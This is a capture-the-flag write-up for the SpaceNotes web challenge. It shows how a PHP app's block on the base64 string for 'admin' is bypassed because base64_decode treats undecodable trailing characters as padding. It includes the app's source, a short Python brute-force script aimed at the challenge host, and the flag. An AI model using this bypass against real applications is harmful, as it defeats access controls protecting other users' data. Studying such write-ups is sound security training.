## SpaceNotes

### Description

We've stumbled upon a straightforward web application of Dark Backdoor that allows note storage without requiring passwords! Sounds too good to be true, doesn't it? Think you can access the admin note ? If you can get us this access we may be able to understand how they broke into our satelites and maybe regain control over these !

### Solution

The challenge is a simple web app to see the notes from other users.
Our goal is to see the not that the admin posted which contains the flag:

```php
<?php if (!isset($_GET["username"])): ?>
            <h1>SpaceNotes</h1>
            <p>Specify a username in base64 to access your notes.</p>
            <p>Example: <a href="/?username=<?php echo base64_encode("toto"); ?>">toto</a></p>
            <p>🛑 Admin notes are restricted 🛑</p>
        
        <?php else: ?>
            <?php if ($decodedUsername === ""): ?>
                <h1>Error</h1>
                <p class="error">Invalid username</p>

            <?php elseif ($decodedUsername === "admin"): ?>
                <h1>🟢 Welcome admin! 🟢</h1>
                <p><?php echo $flagMessage; ?></p>

            <?php else: ?>
                <h1>🟠 Welcome <?php echo htmlspecialchars($decodedUsername); ?>! 🟠</h1>
                <p>Nothing here 🚀</p>
                
            <?php endif; ?>
```

The way we specify users is by using their base64 representation. 
However it filters when we use the base64 of admin which is `YWRtaW4`, additionally it filters padding with equals(`=`):

```php
if (isset($_GET["username"])) {
    $encodedUsername = str_replace("=", "", $_GET["username"]);

    // Username is not admin
    if ($encodedUsername === "YWRtaW4") {
        $decodedUsername = "";
    } else {
        $decodedUsername = base64_decode($encodedUsername);

        // Check if the username contains only alphanumeric characters and underscores
        if (!preg_match('/^[a-zA-Z0-9_]+$/', $decodedUsername)) {
            $decodedUsername = "";
        }
    }
}
```

It seems impossible, however looking at the documentation of base64_decode php function, <https://www.php.net/manual/en/function.base64-decode.php>, we found something interesting: 

*Note, that padding characters are not limited to "=". any character(s) at the end of the string that cannot be decoded will be interpreted as padding. if $strict is set to true, of course padding characters are limited to base64 characters.* 

<https://www.php.net/manual/en/function.base64-decode.php#129170>

That means that we can try to use other characters in order to add padding and not be equal to `YWRtaW4`.
I have developed a script to bruteforce using every ascii character and it was successful:

```python
import string
import base64 
import requests


for i in string.printable:
    sample_string = "admin"+i
    sample_string_bytes = sample_string.encode("ascii") 
    base64_bytes = base64.b64encode(sample_string_bytes) 
    base64_string = base64_bytes.decode("ascii") 
    res = requests.get(f"http://chall.ctf.thcon.party:32884/?username={base64_string}")
    if "Invalid username" not in res.text and "Nothing here" not in res.text:
        print(res.text)

```

Flag: `THCon{pHP_is_S0_w3ird_d00d}`